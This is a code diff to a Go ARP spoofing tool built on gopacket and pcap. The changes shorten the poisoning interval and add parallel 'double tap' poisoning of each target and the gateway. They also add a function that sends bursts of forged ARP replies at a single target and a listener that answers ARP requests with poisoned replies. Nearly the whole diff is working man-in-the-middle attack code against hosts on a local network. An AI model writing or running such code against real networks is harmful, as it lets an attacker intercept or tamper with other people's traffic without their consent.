@@ -37,21 +37,16 @@ func NewSpoofer(iface string, myMAC net.HardwareAddr, myIP net.IP, gatewayIP net
 }
 
 func (s *Spoofer) Start() error {
-	// Open Handle untuk Write & Read (Reactive)
 	handle, err := pcap.OpenLive(s.InterfaceName, 65536, true, pcap.BlockForever)
 	if err != nil { return err }
 	s.handle = handle
-
 	s.handle.SetBPFFilter("arp")
 
-	// 1. TIME BASED SPOOFING (Routine check)
-	ticker := time.NewTicker(500 * time.Millisecond)
+	ticker := time.NewTicker(100 * time.Millisecond) // Adjust the interval as needed
 	
 	go func() {
 		defer s.handle.Close()
 		defer ticker.Stop()
-
-		// Goroutine Reactive Listener
 		go s.reactiveLoop()
 
 		for {
@@ -60,10 +55,14 @@ func (s *Spoofer) Start() error {
 				s.RestoreAll()
 				return
 			case <-ticker.C:
-				// Burst Mode Standard
 				targets := s.Session.GetAllTargets()
+				// Paralel Attack Loop
 				for _, t := range targets {
 					go func(target *models.TargetConfig) {
+						s.sendPoison(target.IP, target.MAC, s.GatewayIP, s.MyMAC)
+						s.sendPoison(s.GatewayIP, s.GatewayMAC, target.IP, s.MyMAC)
+						time.Sleep(2 * time.Millisecond)
+						// Double tap
 						s.sendPoison(target.IP, target.MAC, s.GatewayIP, s.MyMAC)
 						s.sendPoison(s.GatewayIP, s.GatewayMAC, target.IP, s.MyMAC)
 					}(t)
@@ -71,25 +70,33 @@ func (s *Spoofer) Start() error {
 			}
 		}
 	}()
-	
 	return nil
+}
+
+// [FIX BUG SECOND ATTACKS].
+func (s *Spoofer) AttackSingleTarget(t *models.TargetConfig) {
+	if s.handle == nil { return }
+	// Send 10 rapid poison packets to ensure the target is poisoned
+	go func() {
+		for i := 0; i < 10; i++ {
+			s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
+			s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
+			time.Sleep(10 * time.Millisecond)
+		}
+	}()
 }
 
 func (s *Spoofer) reactiveLoop() {
 	src := gopacket.NewPacketSource(s.handle, layers.LayerTypeEthernet)
 	in := src.Packets()
-
 	for {
 		select {
-		case <-s.StopChan:
-			return
+		case <-s.StopChan: return
 		case packet, ok := <-in:
 			if !ok { return }
-			
 			arpLayer := packet.Layer(layers.LayerTypeARP)
 			if arpLayer == nil { continue }
 			arp, _ := arpLayer.(*layers.ARP)
-
 			if arp.Operation != layers.ARPRequest { continue }
 
 			reqIP := net.IP(arp.DstProtAddress)
@@ -100,7 +107,6 @@ func (s *Spoofer) reactiveLoop() {
 					s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
 				}
 			}
-
 			if t := s.findTargetByIP(reqIP); t != nil {
 				s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
 			}
@@ -111,9 +117,7 @@ func (s *Spoofer) reactiveLoop() {
 func (s *Spoofer) findTargetByIP(ip net.IP) *models.TargetConfig {
 	targets := s.Session.GetAllTargets()
 	for _, t := range targets {
-		if t.IP.Equal(ip) {
-			return t
-		}
+		if t.IP.Equal(ip) { return t }
 	}
 	return nil
 }
@@ -131,39 +135,26 @@ func (s *Spoofer) RestoreAll() {
 
 func (s *Spoofer) RestoreTarget(t *models.TargetConfig) {
 	if s.handle == nil { return }
-	for i := 0; i < 5; i++ {
-		s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.GatewayMAC)
-		s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, t.MAC)
-		time.Sleep(20 * time.Millisecond)
-	}
+	// Spam real packets to restore ARP cache
+	go func() {
+		for i := 0; i < 10; i++ {
+			s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.GatewayMAC)
+			s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, t.MAC)
+			time.Sleep(10 * time.Millisecond)
+		}
+	}()
 }
 
 func (s *Spoofer) sendPoison(dstIP net.IP, dstMAC net.HardwareAddr, srcIP net.IP, srcMAC net.HardwareAddr) {
 	if s.handle == nil { return }
-	
-	eth := layers.Ethernet{
-		SrcMAC:       s.MyMAC,
-		DstMAC:       dstMAC,
-		EthernetType: layers.EthernetTypeARP,
-	}
+	eth := layers.Ethernet{ SrcMAC: s.MyMAC, DstMAC: dstMAC, EthernetType: layers.EthernetTypeARP }
 	arp := layers.ARP{
-		AddrType:          layers.LinkTypeEthernet,
-		Protocol:          layers.EthernetTypeIPv4,
-		HwAddressSize:     6,
-		ProtAddressSize:   4,
-		Operation:         layers.ARPReply,
-		SourceHwAddress:   []byte(srcMAC),
-		SourceProtAddress: []byte(srcIP),
-		DstHwAddress:      dstMAC, 
-		DstProtAddress:    []byte(dstIP),
+		AddrType: layers.LinkTypeEthernet, Protocol: layers.EthernetTypeIPv4, HwAddressSize: 6, ProtAddressSize: 4, Operation: layers.ARPReply,
+		SourceHwAddress: []byte(srcMAC), SourceProtAddress: []byte(srcIP), DstHwAddress: dstMAC, DstProtAddress: []byte(dstIP),
 	}
-
 	buf := gopacket.NewSerializeBuffer()
 	gopacket.SerializeLayers(buf, gopacket.SerializeOptions{}, &eth, &arp)
-	// Ignore error
 	_ = s.handle.WritePacketData(buf.Bytes())
 }
 
-func (s *Spoofer) Stop() {
-	s.stopOnce.Do(func() { close(s.StopChan) })
-}
+func (s *Spoofer) Stop() { s.stopOnce.Do(func() { close(s.StopChan) }) }
